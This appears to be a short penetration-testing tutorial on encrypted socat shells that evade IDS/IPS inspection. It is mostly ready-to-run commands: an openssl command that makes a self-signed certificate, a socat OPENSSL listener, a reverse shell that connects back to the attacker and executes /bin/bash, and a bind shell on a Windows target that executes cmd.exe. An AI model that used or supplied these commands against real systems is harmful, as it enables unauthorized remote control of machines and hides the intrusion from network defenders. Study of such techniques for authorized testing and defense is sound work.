Because an IDS/IPS wonâ€™t inspect encrypted data, an attacker can take advantage of encryption to evade detection. Unlike encoding, encryption requires an encryption key.

1) We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:

$ openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt

2) This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year.
-We then need to merge the two created files into a single .pem file:

$ cat shell.key shell.crt > shell.pem

3) Now, when we set up our reverse shell listener, we use:

$ socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

-This sets up an OPENSSL listener using our generated certificate. verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate must be used on whichever device is listening.

4) To connect back, we would use:

$ socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash

5) The same technique would apply for a bind shell:

Target:

$ socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
***We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

Attacker:

$ socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -

***Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.
